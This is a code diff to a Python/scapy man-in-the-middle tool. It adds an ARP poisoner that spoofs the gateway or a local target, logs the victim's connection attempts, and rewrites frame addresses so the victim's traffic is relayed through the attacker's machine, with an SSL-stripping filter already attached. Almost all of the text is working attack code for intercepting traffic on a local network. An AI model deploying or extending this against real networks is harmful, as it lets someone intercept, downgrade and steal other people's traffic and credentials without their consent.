@@ -12,14 +12,30 @@ from scapy.layers.inet import IP, TCP, UDP
 from scapy.layers.inet6 import IPv6
 from scapy.layers.l2 import Ether
 from SSLFilter import SSLStripFilter
+from Arp_poisening import ARPPoisoner
 
 class MitmHandler:
 
     
-    def __init__(self, interface, gateway_ip, victim_ip, attacker_mac, attacker_ip, attacker_ipv6, logger):
+    def __init__(self, interface, gateway_ip, victim_ip, attacker_mac, attacker_ip, attacker_ipv6, logger, target_ip=None):
         self.interface = interface
         self.gateway_ip = gateway_ip
         self.victim_ip = victim_ip
+        self.target_ip = target_ip
+        
+        # Determine upstream (Gateway or Local Server)
+        self.upstream_ip = gateway_ip
+        self.upstream_mac = self.get_mac(gateway_ip) # Default
+        
+        if target_ip:
+            target_mac = self.get_mac(target_ip)
+            if target_mac:
+                self.upstream_ip = target_ip
+                self.upstream_mac = target_mac
+                logger(f"Target {target_ip} is local. Spoofing it directly.")
+            else:
+                logger(f"Target {target_ip} is remote. Spoofing gateway.")
+
         self.gateway_mac = self.get_mac(gateway_ip)
         self.victim_mac = self.get_mac(victim_ip)
         self.attacker_mac = attacker_mac
@@ -29,6 +45,15 @@ class MitmHandler:
         self.logger = logger
         self.filters = []
         self.add_filter(SSLStripFilter(self.victim_ip, self.logger))
+        
+        # Initialize ARP Poisoner to spoof upstream
+        self.arp_poisoner = ARPPoisoner(
+            self.interface, 
+            self.victim_ip, 
+            self.upstream_ip, 
+            self.attacker_mac, 
+            self.logger
+        )
 
     def add_filter(self, filter_handler):
         self.filters.append(filter_handler)
@@ -50,6 +75,9 @@ class MitmHandler:
         
         self.running = True
 
+        # Start ARP spoofing
+        self.arp_poisoner.start()
+
         self.sniffing_thread = threading.Thread(
             target=self.sniffing_loop
         )
@@ -58,6 +86,10 @@ class MitmHandler:
 
     def stop(self):
         self.running = False
+
+        # Stop ARP spoofing
+        if hasattr(self, 'arp_poisoner'):
+            self.arp_poisoner.stop()
 
         if self.sniffing_thread:
             self.sniffing_thread.join(timeout=10)
@@ -82,6 +114,10 @@ class MitmHandler:
         if packet.haslayer(Ether) and packet[Ether].src == self.attacker_mac:
             return
         
+        # Listen for request from client
+        if packet.haslayer(TCP) and packet[TCP].flags == 'S' and packet[IP].src == self.victim_ip:
+            self.logger(f"Received connection request from client {self.victim_ip} to {packet[IP].dst}")
+
         forward_packet = True
         for filter_handler in self.filters:
             try:
@@ -128,14 +164,14 @@ class MitmHandler:
             forwarded = False
 
             # From victim to gateway
-            if src_ip in self.target_ips:
+            if src_ip == self.victim_ip:
                 # Pretend that we sent the packet, and send it to the gateway
-                pkt[Ether].dst = self.gateway_mac
+                pkt[Ether].dst = self.upstream_mac
                 pkt[Ether].src = self.attacker_mac
                 forwarded = True
 
             # From gateway to the victim
-            elif dst_ip in self.target_ips:
+            elif dst_ip == self.victim_ip:
                 # Pretend that we sent the packet, and send it to the victim
                 pkt[Ether].dst = self.victim_mac
                 pkt[Ether].src = self.attacker_mac
